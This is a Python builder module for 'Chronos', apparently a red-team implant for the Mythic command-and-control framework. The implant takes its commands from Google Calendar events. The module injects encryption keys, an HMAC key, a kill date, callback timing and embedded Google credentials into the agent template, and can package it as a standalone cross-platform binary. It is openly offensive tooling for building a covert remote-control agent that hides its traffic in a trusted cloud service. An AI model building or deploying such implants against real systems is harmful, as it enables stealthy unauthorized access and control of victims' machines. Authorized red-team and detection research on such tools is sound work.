from mythic_container.MythicCommandBase import *
from mythic_container.PayloadBuilder import *
from mythic_container.MythicRPC import *
from mythic_container.MythicGoRPC.send_mythic_rpc_file_get_content import *
import subprocess
import sys
import json
import base64
import tempfile
from pathlib import Path

class Chronos(PayloadType):
    name = "chronos"
    file_extension = "py"
    author = "@0xNirvana"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = []
    note = """
    Python Mythic agent — polls Google Calendar via Epoch for tasking.
    Supports AES-256-CBC + HMAC-SHA256 (Mythic standard AESPSK).
    """
    supports_dynamic_loading = False
    translation_container = None
    mythic_encrypts = True
    build_parameters = [
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Python version to target",
            choices=["3.8", "3.9", "3.10", "3.11", "3.12"],
            default_value="3.10",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug logging on target (prints to stdout)",
            default_value=False,
        ),
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Output format: Python script or standalone binary (PyInstaller)",
            choices=["script", "binary"],
            default_value="script",
        ),
        BuildParameter(
            name="force_resume_on_checkin_fail",
            parameter_type=BuildParameterType.Boolean,
            description="Continue running if check-in fails (lab/debug only; default exits)",
            default_value=False,
        ),
    ]
    c2_profiles = ["epoch"]
    support_browser_scripts = []
    agent_icon_path = Path(".") / "chronos" / "mythic" / "chronos.svg"
    agent_path = Path(".") / "chronos"
    agent_code_path = Path(".") / "chronos" / "agent_code"

    @staticmethod
    def _prepare_protocol_for_inline(protocol_src: str) -> str:
        """Strip constructs invalid when protocol_v2 is inlined mid-file."""
        out = []
        for line in protocol_src.splitlines():
            stripped = line.strip()
            # __future__ imports must be the first statement in a module.
            if stripped == "from __future__ import annotations":
                continue
            out.append(line)
        return "\n".join(out)

    @staticmethod
    def _inline_protocol_v2(agent_code: str, protocol_src: str) -> str:
        """Replace protocol_v2 import with inlined module source for single-file payloads."""
        protocol_src = Chronos._prepare_protocol_for_inline(protocol_src)
        lines = agent_code.splitlines()
        out = []
        skipping = False
        for line in lines:
            if line.strip().startswith("from protocol_v2 import"):
                skipping = True
                out.append("# --- protocol_v2 (inlined at build) ---")
                out.extend(protocol_src.splitlines())
                continue
            if skipping:
                if line.strip() == ")":
                    skipping = False
                continue
            out.append(line)
        return "\n".join(out)

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        python_version = self.get_parameter("version")

        # Get C2 profile configuration
        c2_config = {}
        for c2 in self.c2info:
            profile_params = c2.get_parameters_dict()
            c2_config[c2.get_c2profile()["name"]] = profile_params

        try:
            agent_code_path = Path(self.agent_code_path) / "chronos_payload.py"
            protocol_path = Path(self.agent_code_path) / "protocol_v2.py"
            with open(agent_code_path, 'r') as f:
                agent_code = f.read()
            with open(protocol_path, 'r') as f:
                protocol_src = f.read()
            agent_code = self._inline_protocol_v2(agent_code, protocol_src)

            epoch_config = c2_config.get('epoch', {})
            poll_interval = epoch_config.get('poll_interval', 20)
            try:
                poll_interval = int(poll_interval)
            except (TypeError, ValueError):
                poll_interval = 20

            poll_warnings = []
            if poll_interval > 30:
                poll_warnings.append(
                    f"Epoch poll_interval={poll_interval}s is high; "
                    "check-in/tasking latency increases. Labs: use 10–15s."
                )
            if poll_interval < 5:
                poll_warnings.append(
                    f"Epoch poll_interval={poll_interval}s is very low; "
                    "may hit Calendar API quota with multiple agents."
                )

            # Core substitutions
            agent_code = agent_code.replace("{{PAYLOAD_UUID}}", self.uuid)
            agent_code = agent_code.replace(
                "{{CALLBACK_INTERVAL}}",
                str(poll_interval)
            )
            agent_code = agent_code.replace(
                "{{CALLBACK_JITTER}}",
                str(epoch_config.get('callback_jitter', 20))
            )
            agent_code = agent_code.replace(
                "{{CALENDAR_ID}}",
                epoch_config.get('calendar_id', 'primary')
            )

            # Kill date (from C2 profile)
            killdate = epoch_config.get('killdate', '')
            agent_code = agent_code.replace("{{KILL_DATE}}", str(killdate))

            # Debug flag (from build parameters)
            debug_flag = self.get_parameter("debug")
            agent_code = agent_code.replace("{{DEBUG}}", str(debug_flag).lower())

            force_resume = self.get_parameter("force_resume_on_checkin_fail")
            agent_code = agent_code.replace(
                "{{FORCE_RESUME_ON_CHECKIN_FAIL}}",
                str(force_resume).lower(),
            )

            # Encryption key (AESPSK)
            # When mythic_encrypts=True, Mythic auto-populates enc_key on the c2 profile
            aespsk = epoch_config.get('AESPSK', '')
            enc_key = ""
            if isinstance(aespsk, dict):
                enc_key = aespsk.get('enc_key', '')
            elif isinstance(aespsk, str):
                enc_key = aespsk
            agent_code = agent_code.replace("{{AESPSK}}", enc_key)

            # Event HMAC key for calendar event authentication
            event_hmac_key = epoch_config.get('event_hmac_key', '')
            agent_code = agent_code.replace("{{EVENT_HMAC_KEY}}", event_hmac_key)

            # Google credentials
            if 'credentials_file' in epoch_config:
                creds_file_id = epoch_config['credentials_file']
                creds_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=creds_file_id)
                )
                if creds_resp.Success:
                    creds_content = creds_resp.Content.decode('utf-8') if isinstance(
                        creds_resp.Content, bytes) else creds_resp.Content
                    try:
                        json.loads(creds_content)  # Validate JSON
                        creds_b64 = base64.b64encode(
                            creds_content.encode('utf-8')).decode('ascii')
                        agent_code = agent_code.replace("{{GOOGLE_CREDENTIALS}}", creds_b64)
                    except json.JSONDecodeError as e:
                        resp.set_status(BuildStatus.Error)
                        resp.set_build_message(f"Invalid credentials JSON: {e}")
                        return resp
                else:
                    resp.set_status(BuildStatus.Error)
                    resp.set_build_message(f"Failed to get credentials: {creds_resp.Error}")
                    return resp
            else:
                agent_code = agent_code.replace("{{GOOGLE_CREDENTIALS}}", "{}")

            output_type = self.get_parameter("output_type")
            build_notes = []
            if poll_warnings:
                build_notes.extend(poll_warnings)
            build_notes.append(
                f"Agent CALLBACK_INTERVAL={poll_interval}s (from Epoch at build time). "
                "Rebuild Chronos after changing Epoch poll_interval in Mythic UI."
            )
            notes_suffix = " | ".join(build_notes)

            if output_type == "binary":
                # PyInstaller single-file binary
                with tempfile.TemporaryDirectory() as tmpdir:
                    src_path = Path(tmpdir) / "chronos.py"
                    with open(src_path, 'w') as f:
                        f.write(agent_code)

                    result = subprocess.run(
                        [
                            "pyinstaller", "--onefile", "--clean",
                            "--distpath", str(Path(tmpdir) / "dist"),
                            "--workpath", str(Path(tmpdir) / "build"),
                            "--specpath", tmpdir,
                            "--name", "chronos",
                            "--hidden-import", "google.auth",
                            "--hidden-import", "google.oauth2",
                            "--hidden-import", "google.auth.transport.requests",
                            "--hidden-import", "googleapiclient",
                            "--hidden-import", "Crypto",
                            "--hidden-import", "Crypto.Cipher",
                            "--hidden-import", "Crypto.Util.Padding",
                            str(src_path),
                        ],
                        capture_output=True, text=True, timeout=300,
                    )

                    binary_path = Path(tmpdir) / "dist" / "chronos"
                    if binary_path.exists():
                        resp.payload = binary_path.read_bytes()
                        resp.set_build_message(
                            f"Chronos binary built for Python {python_version} "
                            f"(encryption: {'enabled' if enc_key else 'disabled'}, "
                            f"size: {len(resp.payload)} bytes). {notes_suffix}"
                        )
                    else:
                        resp.set_status(BuildStatus.Error)
                        resp.set_build_message(
                            f"PyInstaller build failed:\n{result.stderr[-1000:]}"
                        )
                        return resp
            else:
                resp.payload = agent_code.encode()
                resp.set_build_message(
                    f"Chronos built for Python {python_version} "
                    f"(encryption: {'enabled' if enc_key else 'disabled'}). {notes_suffix}"
                )

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.set_build_message(f"Error building payload: {e}")

        return resp
